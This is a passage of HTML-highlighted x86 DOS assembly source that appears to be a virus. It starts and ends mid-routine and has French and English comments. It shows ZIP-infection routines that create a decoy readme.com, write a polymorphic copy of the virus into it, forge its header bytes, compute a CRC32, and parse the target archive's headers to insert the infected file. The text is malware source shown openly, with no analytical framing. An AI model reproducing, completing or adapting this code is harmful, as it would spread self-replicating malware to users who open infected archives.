</span><span class="sc1">;************************************************************</span><span class="sc0">

</span><span class="sc5">infecte_zip_from_w95</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">push_all</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">evite_recherche_du_nom</span><span class="sc0">

</span><span class="sc5">infecte_zip_from_dos</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">push_all</span><span class="sc0">

</span><span class="sc1">;----------------get full zip file name from FCB-----------------</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buffer_name</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">get_first_name_part</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">lodsb</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">end_name</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">get_first_name_part</span><span class="sc0">
</span><span class="sc5">end_name</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"."</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"IZ"</span><span class="sc0">
</span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"P"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">stosw</span><span class="sc0">

</span><span class="sc5">evite_recherche_du_nom</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

</span><span class="sc1">;-----------create readme.com on disk--------------------</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd_get</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">42</span><span class="sc0">
</span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">add1</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">84</span><span class="sc0">
</span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">add2</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">126</span><span class="sc0">
</span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">add3</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">end_zip_infect</span><span class="sc0">

</span><span class="sc5">add3</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">;route</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">taille_fse</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">file_add_size3</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">file_add_content3</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">suite_readme</span><span class="sc0">
</span><span class="sc5">add2</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">;defile</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">taille_fse</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">file_add_size2</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">file_add_content2</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">suite_readme</span><span class="sc0">
</span><span class="sc5">add1</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">;etoiles</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">taille_fse</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">file_add_size1</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">file_add_content1</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">

</span><span class="sc5">suite_readme</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">contenu</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">13B0h</span><span class="sc0">     </span><span class="sc1">;fake original add_file starting 4 bytes</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">contenu</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">10CDh</span><span class="sc0">   </span><span class="sc1">;they all have the same</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">com_fse</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">POLY_FROM_RESIDENT</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">virus_zip_size</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

</span><span class="sc5">create_temp_add_file</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">file_add</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">create_file</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_add_handle</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">

</span><span class="sc5">write_temp_add_file_content</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">taille_fse</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">100h</span><span class="sc1">;a partir de now, taille_fse sert a stocker file_add_size</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">taille_fse</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">write_file</span><span class="sc0">

</span><span class="sc5">write_virus_to_temp_add_file</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">virus_zip_size</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">heap</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">write_file</span><span class="sc0">

</span><span class="sc5">pointer_to_start_of_temp_add_file</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pointeur_debut</span><span class="sc0">

</span><span class="sc1">;--------------------------calcule CRC---------------------------</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">heap</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc0">

</span><span class="sc5">c_crc32</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">zip_crc_32</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc2">0ffffh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">zip_crc_32</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc2">0ffffh</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">gentable</span><span class="sc0">

</span><span class="sc5">read_next</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">                         </span><span class="sc1">; !!!!</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">1024</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_add_handle</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">read_file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">crc32_ret</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">1024</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">calc_crc32</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">read_next</span><span class="sc0">

</span><span class="sc5">crc32_ret</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">zip_crc_32</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">zip_crc_32</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
         </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">fin_crc</span><span class="sc0">

</span><span class="sc5">calc_crc32</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">les</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">zip_crc_32</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
</span><span class="sc5">c_crc</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc8">bh</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc8">dh</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">les</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">c_crc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">zip_crc_32</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">zip_crc_32</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; bp - where make table</span><span class="sc0">
</span><span class="sc5">gentable</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc5">gentab_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">gentab_2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">rcr</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">rcr</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnb</span><span class="sc0">     </span><span class="sc5">gentab_3</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0edb8h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">8320h</span><span class="sc0">
</span><span class="sc5">gentab_3</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">gentab_2</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">gentab_1</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">fin_crc</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">

</span><span class="sc5">put_crc_in_second_location</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">zip_crc_32</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">zip_crc_32_</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">zip_crc_32</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">zip_crc_32_</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc1">;--------analyse zip file, save central dir and end header---------------</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">buffer_name</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">open_file</span><span class="sc0">
</span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">open_ok</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">end_zip_infect</span><span class="sc0">
</span><span class="sc5">open_ok</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">zip_handle</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">recup_timedate</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">number_of_entries</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">130</span><span class="sc0">     </span><span class="sc1">;compteur de fichiers inside zip</span><span class="sc0">

</span><span class="sc5">read_local_hdr</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">number_of_entries</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">close_add</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">heap</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">read_file</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">heap</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc3">"KP"</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">zipsign_ok</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">end_zip_infect</span><span class="sc0">

</span><span class="sc5">zipsign_ok</span><span class="sc4">:</span><span class="sc0">
